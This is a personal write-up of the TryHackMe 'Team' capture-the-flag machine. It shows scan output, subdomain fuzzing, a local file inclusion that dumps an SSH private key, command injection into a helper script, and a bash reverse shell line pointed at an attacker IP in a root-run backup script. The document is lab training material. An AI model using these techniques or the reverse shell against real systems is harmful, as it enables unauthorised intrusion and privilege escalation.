Name: Team  
Date: 03/05/2022  
Difficulty: Easy  
Description: Beginner friendly boot2root machine  
Better Description: N/A  
Goals: lfi, webhacking find my weaknesses  
Learnt:
1. Recursive methodoly not on point - started a idiot checklist for things I forget 
1. Subdomain bruteforcing reminder and a reminder to start bughunting with a basic version of my tool.
1. Really need to do more real stuff.
1. Choose between ffuf and wfuzz - ippsec like wfuzz, but I think I might learn ffuf from [room](https://tryhackme.com/room/ffuf) and add to Archive, its in Golang - probably faster. So ffuf


root@ip-10-10-203-238:~# nmap -sC -sV -O -T 4 -p- 10.10.239.218

Starting Nmap 7.60 ( https://nmap.org ) at 2022-03-04 17:25 GMT
Nmap scan report for ip-10-10-239-218.eu-west-1.compute.internal (10.10.239.218)
Host is up (0.00046s latency).
Not shown: 65532 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 79:5f:11:6a:85:c2:08:24:30:6c:d4:88:74:1b:79:4d (RSA)
|   256 af:7e:3f:7e:b4:86:58:83:f1:f6:a2:54:a6:9b:ba:ad (ECDSA)
|_  256 26:25:b0:7b:dc:3f:b2:94:37:12:5d:cd:06:98:c7:9f (EdDSA)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works! If you see this add 'te...
MAC Address: 02:16:3F:3D:6D:31 (Unknown)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.13 (93%), Linux 3.8 (93%), Crestron XPanel control system (89%), HP P2000 G3 NAS device (86%), ASUS RT-N56U WAP (Linux 3.4) (86%), Linux 3.1 (86%), Linux 3.16 (86%), Linux 3.2 (86%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (86%), Linux 2.6.32 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 632.58 seconds

I reconed this without looking at the webpage while studying and did not see that it demands a dnsname in /etc/hosts.
Re did recon:

![hosts](Screenshots/thm-team-hosts.png)

```bash
root@ip-10-10-206-200:~# nikto -h team.thm
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.10.248.78
+ Target Hostname:    team.thm
+ Target Port:        80
+ Start Time:         2022-05-03 09:10:10 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.29 (Ubuntu)
+ Server leaks inodes via ETags, header found with file /, fields: 0xb96 0x5b8f5d3f6f5b7 
+ The anti-clickjacking X-Frame-Options header is not present.
+ "robots.txt" retrieved but it does not contain any 'disallow' entries (which is odd).
+ Allowed HTTP Methods: OPTIONS, HEAD, GET, POST 
+ OSVDB-3268: /images/: Directory indexing found.
+ OSVDB-3268: /images/?pattern=/etc/*&sort=name: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 6544 items checked: 0 error(s) and 7 item(s) reported on remote host
+ End Time:           2022-05-03 09:10:21 (GMT1) (11 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

nmap --script discovery -p 80 team.thm

Starting Nmap 7.60 ( https://nmap.org ) at 2022-05-03 09:12 BST
Pre-scan script results:
| targets-asn: 
|_  targets-asn.asn is a mandatory parameter
Nmap scan report for team.thm (10.10.248.78)
Host is up (0.00018s latency).

PORT   STATE SERVICE
80/tcp open  http
|_http-chrono: Request times for /; avg: 194.99ms; min: 178.70ms; max: 222.89ms
| http-comments-displayer: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=team.thm
|     
|     Path: http://team.thm/assets/css/main.css
|     Line number: 1836
|     Comment: 
|         /* Box */
|     
|     Path: http://team.thm/#
|     Line number: 32
|     Comment: 
|         <!-- Main -->
|     
|     Path: http://team.thm/assets/css/main.css
|     Line number: 1608
|     Comment: 
|         /* Section/Article */
|     
|     Path: http://team.thm/#
|     Line number: 35
|     Comment: 
|         <!-- Thumbnails -->
|     
|     Path: http://team.thm/assets/css/main.css
|     Line number: 2583
|     Comment: 
|         /* Header */
|     
|     Path: http://team.thm/assets/css/main.css
|     Line number: 2201
|     Comment: 
|         /* Button */
|     
|     Path: http://team.thm/assets/js/jquery.min.js
|     Line number: 1
|     Comment: 
|         /*! jQuery v2.2.1 | (c) jQuery Foundation | jquery.org/license */
|     
|     Path: http://team.thm/#
|     Line number: 16
|     Comment: 
|         <!-- Wrapper -->
|     
|     Path: http://team.thm/assets/css/main.css
|     Line number: 2553
|     Comment: 
|         /* Wrapper */
|     
|     Path: http://team.thm/assets/css/main.css
|     Line number: 2491
|     Comment: 
|         /* Poptrox */
|     
|     Path: http://team.thm/assets/css/main.css
|     Line number: 2376
|     Comment: 
|         /* Thumbnails */
|     
|     Path: http://team.thm/assets/css/main.css
|     Line number: 2133
|     Comment: 
|         /* Table */
|     
|     Path: http://team.thm/#
|     Line number: 2
|     Comment: 
|         <!--
|         	Visualize by TEMPLATED
|         	templated.co @templatedco
|         	Released for free under the Creative Commons Attribution 3.0 license (templated.co/license)
|         -->
|     
|     Path: http://team.thm/#
|     Line number: 87
|     Comment: 
|         <!-- Need to update this page more -->
|     
|     Path: http://team.thm/assets/css/main.css
|     Line number: 1964
|     Comment: 
|         /* List */
|     
|     Path: http://team.thm/assets/css/main.css
|     Line number: 11
|     Comment: 
|         /* Reset */
|     
|     Path: http://team.thm/#
|     Line number: 75
|     Comment: 
|         <!-- Footer -->
|     
|     Path: http://team.thm/#
|     Line number: 82
|     Comment: 
|         <!-- Scripts -->
|     
|     Path: http://team.thm/assets/css/main.css
|     Line number: 1637
|     Comment: 
|         /* Form */
|     
|     Path: http://team.thm/assets/css/main.css
|     Line number: 1910
|     Comment: 
|         /* Image */
|     
|     Path: http://team.thm/assets/css/main.css
|     Line number: 1857
|     Comment: 
|         /* Icon */
|     
|     Path: http://team.thm/assets/css/main.css
|     Line number: 2617
|     Comment: 
|         /* Footer */
|     
|     Path: http://team.thm/assets/css/main.css
|     Line number: 1429
|     Comment: 
|         /* Type */
|     
|     Path: http://team.thm/assets/css/main.css
|     Line number: 60
|     Comment: 
|         /* Grid */
|     
|     Path: http://team.thm/assets/css/main.css
|     Line number: 1393
|     Comment: 
|         /* Basic */
|     
|     Path: http://team.thm/assets/js/skel.min.js
|     Line number: 1
|     Comment: 
|         /* skel.js v3.0.0 | (c) n33 | skel.io | MIT licensed */
|     
|     Path: http://team.thm/assets/js/jquery.poptrox.min.js
|     Line number: 1
|     Comment: 
|         /* jquery.poptrox.js v2.5.2-dev | (c) n33 | n33.co | MIT licensed */
|     
|     Path: http://team.thm/assets/css/main.css
|     Line number: 52
|     Comment: 
|         /* Box Model */
|     
|     Path: http://team.thm/assets/css/main.css
|     Line number: 5
|     Comment: 
|         /*
|         	Visualize by TEMPLATED
|         	templated.co @templatedco
|         	Released for free under the Creative Commons Attribution 3.0 license (templated.co/license)
|         */
|     
|     Path: http://team.thm/assets/js/main.js
|     Line number: 1
|     Comment: 
|         /*
|         	Visualize by TEMPLATED
|         	templated.co @templatedco
|         	Released for free under the Creative Commons Attribution 3.0 license (templated.co/license)
|         */
|     
|     Path: http://team.thm/#
|     Line number: 19
|     Comment: 
|_        <!-- Header -->
|_http-date: Tue, 03 May 2022 08:12:37 GMT; -1s from local time.
|_http-devframework: Couldn't determine the underlying framework or CMS. Try increasing 'httpspider.maxpagecount' value to spider more pages.
| http-enum: 
|   /robots.txt: Robots file
|_  /images/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|_http-errors: Couldn't find any error pages.
|_http-feed: Couldn't find any feeds.
| http-headers: 
|   Date: Tue, 03 May 2022 08:12:39 GMT
|   Server: Apache/2.4.29 (Ubuntu)
|   Last-Modified: Fri, 15 Jan 2021 20:00:46 GMT
|   ETag: "b96-5b8f5d3f6f5b7"
|   Accept-Ranges: bytes
|   Content-Length: 2966
|   Vary: Accept-Encoding
|   Connection: close
|   Content-Type: text/html
|   
|_  (Request type: HEAD)
|_http-mobileversion-checker: No mobile version detected.
|_http-referer-checker: Couldn't find any cross-domain scripts.
|_http-security-headers: 
| http-sitemap-generator: 
|   Directory structure:
|     /
|       Other: 1
|     /assets/js/
|       js: 4
|     /images/
|       jpg: 1
|     /images/fulls/
|       jpg: 6
|     /images/thumbs/
|       jpg: 7
|   Longest directory structure:
|     Depth: 2
|     Dir: /images/fulls/
|   Total files found (by extension):
|_    Other: 1; jpg: 14; js: 4
|_http-title: Team
| http-useragent-tester: 
|   Status for browser useragent: 200
|   Allowed User Agents: 
|     Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)
|     libwww
|     lwp-trivial
|     libcurl-agent/1.0
|     PHP/
|     Python-urllib/2.5
|     GT::WWW
|     Snoopy
|     MFC_Tear_Sample
|     HTTP::Lite
|     PHPCrawl
|     URI::Fetch
|     Zend_Http_Client
|     http client
|     PECL::HTTP
|     Wget/1.13.4 (linux-gnu)
|_    WWW-Mechanize/1.34
| http-vhosts: 
|_127 names had status 200
|_http-xssed: No previously reported XSS vuln.
MAC Address: 02:B0:58:8E:39:AB (Unknown)

Host script results:
| dns-brute: 
|_  DNS Brute-force hostnames: No results.
|_fcrdns: PASS (team.thm)
|_ipidseq: All zeros
|_path-mtu: PMTU == 9001
| resolveall: 
|   Host 'team.thm' also resolves to:
|_  Use the 'newtargets' script-arg to add the results as targets

Nmap done: 1 IP address (1 host up) scanned in 29.10 seconds


dirb http://team.thm

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Tue May  3 09:21:06 2022
URL_BASE: http://team.thm/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://team.thm/ ----
==> DIRECTORY: http://team.thm/assets/                                         
==> DIRECTORY: http://team.thm/images/                                         
+ http://team.thm/index.html (CODE:200|SIZE:2966)                              
+ http://team.thm/robots.txt (CODE:200|SIZE:5)                                 
==> DIRECTORY: http://team.thm/scripts/                                        
+ http://team.thm/server-status (CODE:403|SIZE:273)                            
                                                                               
---- Entering directory: http://team.thm/assets/ ----
==> DIRECTORY: http://team.thm/assets/css/                                     
==> DIRECTORY: http://team.thm/assets/fonts/                                   
==> DIRECTORY: http://team.thm/assets/js/                                      
                                                                               
---- Entering directory: http://team.thm/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
---- Entering directory: http://team.thm/scripts/ ----
                                                                               
---- Entering directory: http://team.thm/assets/css/ ----
                                                                               
---- Entering directory: http://team.thm/assets/fonts/ ----
                                                                               
---- Entering directory: http://team.thm/assets/js/ ----
                                                                               
-----------------
END_TIME: Tue May  3 09:21:22 2022
DOWNLOADED: 27672 - FOUND: 3
```

In Robots.txt is just: dale

[Subdomains are a thing thanks abhi](https://github.com/abhi-agrawl/tryhackme-writeups/tree/main/team)

```bash

wfuzz -c -u http://team.thm -H "Host:FUZZ.team.thm" -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt --hw 977

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.2.9 - The Web Fuzzer                         *
********************************************************

Target: http://team.thm/
Total requests: 19983

==================================================================
ID	Response   Lines      Word         Chars          Payload    
==================================================================

000019:  C=200      9 L	      20 W	    187 Ch	  "dev"
000001:  C=200     89 L	     220 W	   2966 Ch	  "www"
000085:  C=200      9 L	      20 W	    187 Ch	  "www.dev"
000690:  C=400     12 L	      53 W	    422 Ch	  "gc._msdcs"
001062:  C=200    373 L	     977 W	  11366 Ch	  "Chelyabinsk-RNOC-RR02001176:  C=200     89 L	     220 W	   2966 Ch	  "WWW"
001201:  C=200    373 L	     977 W	  11366 Ch	  "cisco-capwap-controll001568:  C=200    373 L	     977 W	  11366 Ch	  "cisco-lwapp-controlle003416:  C=200    373 L	     977 W	  11366 Ch	  "CISCO-LWAPP-CONTROLLE003726:  C=200    373 L	     977 W	  11366 Ch	  "autodiscover.director003811:  C=200    373 L	     977 W	  11366 Ch	  "www.sierracharlie.use003840:  C=200    373 L	     977 W	  11366 Ch	  "www.voodoodigital.use003863:  C=200    373 L	     977 W	  11366 Ch	  "www.pidlabelling.user003919:  C=200    373 L	     977 W	  11366 Ch	  "cloudflare-resolve-to004393:  C=200    373 L	     977 W	  11366 Ch	  "adslnat-curridabat-12004656:  C=200    373 L	     977 W	  11366 Ch	  "CISCO-CAPWAP-CONTROLL005158:  C=200    373 L	     977 W	  11366 Ch	  "coupang4"^C
Finishing pending requests...

```
Added the three dev, www, and www.dev to /etc/hosts and wonder whether there is abetter way to manage /etc/hosts again.


![devsubdomain](Screenshots/underdeveloped.png)

`http://dev.team.thm/script.php?page=teamshare.php`

![lfi](Screenshots/lfi.png)

Curl to victory!
```bash
curl http://dev.team.thm/script.php?page=/etc/ssh/sshd_config

...

#Dale id_rsa
#-----BEGIN OPENSSH PRIVATE KEY-----
#b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
#NhAAAAAwEAAQAAAYEAng6KMTH3zm+6rqeQzn5HLBjgruB9k2rX/XdzCr6jvdFLJ+uH4ZVE
#NUkbi5WUOdR4ock4dFjk03X1bDshaisAFRJJkgUq1+zNJ+p96ZIEKtm93aYy3+YggliN/W
#oG+RPqP8P6/uflU0ftxkHE54H1Ll03HbN+0H4JM/InXvuz4U9Df09m99JYi6DVw5XGsaWK
#o9WqHhL5XS8lYu/fy5VAYOfJ0pyTh8IdhFUuAzfuC+fj0BcQ6ePFhxEF6WaNCSpK2v+qxP
#zMUILQdztr8WhURTxuaOQOIxQ2xJ+zWDKMiynzJ/lzwmI4EiOKj1/nh/w7I8rk6jBjaqAu
#k5xumOxPnyWAGiM0XOBSfgaU+eADcaGfwSF1a0gI8G/TtJfbcW33gnwZBVhc30uLG8JoKS
#xtA1J4yRazjEqK8hU8FUvowsGGls+trkxBYgceWwJFUudYjBq2NbX2glKz52vqFZdbAa1S
#0soiabHiuwd+3N/ygsSuDhOhKIg4MWH6VeJcSMIrAAAFkNt4pcTbeKXEAAAAB3NzaC1yc2
#EAAAGBAJ4OijEx985vuq6nkM5+RywY4K7gfZNq1/13cwq+o73RSyfrh+GVRDVJG4uVlDnU
#eKHJOHRY5NN19Ww7IWorABUSSZIFKtfszSfqfemSBCrZvd2mMt/mIIJYjf1qBvkT6j/D+v
#7n5VNH7cZBxOeB9S5dNx2zftB+CTPyJ177s+FPQ39PZvfSWIug1cOVxrGliqPVqh4S+V0v
#JWLv38uVQGDnydKck4fCHYRVLgM37gvn49AXEOnjxYcRBelmjQkqStr/qsT8zFCC0Hc7a/
#FoVEU8bmjkDiMUNsSfs1gyjIsp8yf5c8JiOBIjio9f54f8OyPK5OowY2qgLpOcbpjsT58l
#gBojNFzgUn4GlPngA3Ghn8EhdWtICPBv07SX23Ft94J8GQVYXN9LixvCaCksbQNSeMkWs4
#xKivIVPBVL6MLBhpbPra5MQWIHHlsCRVLnWIwatjW19oJSs+dr6hWXWwGtUtLKImmx4rsH
#ftzf8oLErg4ToSiIODFh+lXiXEjCKwAAAAMBAAEAAAGAGQ9nG8u3ZbTTXZPV4tekwzoijb
#esUW5UVqzUwbReU99WUjsG7V50VRqFUolh2hV1FvnHiLL7fQer5QAvGR0+QxkGLy/AjkHO
#eXC1jA4JuR2S/Ay47kUXjHMr+C0Sc/WTY47YQghUlPLHoXKWHLq/PB2tenkWN0p0fRb85R
#N1ftjJc+sMAWkJfwH+QqeBvHLp23YqJeCORxcNj3VG/4lnjrXRiyImRhUiBvRWek4o4Rxg
#Q4MUvHDPxc2OKWaIIBbjTbErxACPU3fJSy4MfJ69dwpvePtieFsFQEoJopkEMn1Gkf1Hyi
#U2lCuU7CZtIIjKLh90AT5eMVAntnGlK4H5UO1Vz9Z27ZsOy1Rt5svnhU6X6Pldn6iPgGBW
#/vS5rOqadSFUnoBrE+Cnul2cyLWyKnV+FQHD6YnAU2SXa8dDDlp204qGAJZrOKukXGIdiz
#82aDTaCV/RkdZ2YCb53IWyRw27EniWdO6NvMXG8pZQKwUI2B7wljdgm3ZB6fYNFUv5AAAA
#wQC5Tzei2ZXPj5yN7EgrQk16vUivWP9p6S8KUxHVBvqdJDoQqr8IiPovs9EohFRA3M3h0q
#z+zdN4wIKHMdAg0yaJUUj9WqSwj9ItqNtDxkXpXkfSSgXrfaLz3yXPZTTdvpah+WP5S8u6
#RuSnARrKjgkXT6bKyfGeIVnIpHjUf5/rrnb/QqHyE+AnWGDNQY9HH36gTyMEJZGV/zeBB7
#/ocepv6U5HWlqFB+SCcuhCfkegFif8M7O39K1UUkN6PWb4/IoAAADBAMuCxRbJE9A7sxzx
#sQD/wqj5cQx+HJ82QXZBtwO9cTtxrL1g10DGDK01H+pmWDkuSTcKGOXeU8AzMoM9Jj0ODb
#mPZgp7FnSJDPbeX6an/WzWWibc5DGCmM5VTIkrWdXuuyanEw8CMHUZCMYsltfbzeexKiur
#4fu7GSqPx30NEVfArs2LEqW5Bs/bc/rbZ0UI7/ccfVvHV3qtuNv3ypX4BuQXCkMuDJoBfg
#e9VbKXg7fLF28FxaYlXn25WmXpBHPPdwAAAMEAxtKShv88h0vmaeY0xpgqMN9rjPXvDs5S
#2BRGRg22JACuTYdMFONgWo4on+ptEFPtLA3Ik0DnPqf9KGinc+j6jSYvBdHhvjZleOMMIH
#8kUREDVyzgbpzIlJ5yyawaSjayM+BpYCAuIdI9FHyWAlersYc6ZofLGjbBc3Ay1IoPuOqX
#b1wrZt/BTpIg+d+Fc5/W/k7/9abnt3OBQBf08EwDHcJhSo+4J4TFGIJdMFydxFFr7AyVY7
#CPFMeoYeUdghftAAAAE3A0aW50LXA0cnJvdEBwYXJyb3QBAgMEBQYH
#-----END OPENSSH PRIVATE KEY-----
```

Use sed to remove the hashes at the start of the line! Chmod and ssh in to box as Dale

``bash
sed -i 's/^#//' id_rsa
chmod 600 id_rsa
ssh -i id_rsa dale@$IP
```

![sshin](Screenshots/sshindale.png)

in /home/gyles is a admin_check bash script

```bash

dale@TEAM:/home/gyles$ ls
admin_checks
dale@TEAM:/home/gyles$ cat admin_checks
#!/bin/bash

printf "Reading stats.\n"
sleep 1
printf "Reading stats..\n"
sleep 1
read -p "Enter name of person backing up the data: " name
echo $name  >> /var/stats/stats.txt
read -p "Enter 'date' to timestamp the file: " error
printf "The Date is "
$error 2>/dev/null

date_save=$(date "+%F-%H-%M")
cp /var/stats/stats.txt /var/stats/stats-$date_save.bak

printf "Stats have been backed up\n"
```
pass both `/bin/bash` to both read vars `name` and `error`

![admin](Screenshots/admin_checks.png)

In gyles .bash_history references to a chmod 770 admin_stuff as directory in /opt/. 
It contains a script.sh; the variables are root owned.

![script](Screenshots/script.png

tried adding a reverse shell into main_backup.sh

```
bash -i >& /dev/tcp/10.10.206.200/1234 0>&1
```

![rooted](Screenshots/rooted.png)






